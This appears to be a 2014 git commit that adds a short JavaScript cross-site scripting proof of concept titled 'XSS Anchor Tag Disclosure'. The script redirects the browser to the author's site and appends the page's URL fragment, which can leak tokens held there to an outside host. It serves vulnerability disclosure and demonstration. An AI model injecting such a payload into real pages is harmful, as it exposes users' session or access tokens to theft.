59d41d6c621e65b11e8566b6a1fef87606c2b796
Adam Ziaja <adamziaja@users.noreply.github.com>
2014-05-31 20:09:06 +0200

    XSS Anchor Tag Disclosure

---
+++ xss_anchor_poc.js
@@ -0,0 +1,5 @@
+<script>
+    // XSS Anchor Tag Disclosure
+    // (C) 2014 Adam Ziaja <adam@adamziaja.com> http://adamziaja.com
+    location.replace("http://adamziaja.com/?" + location.hash.substr(1))
+</script>
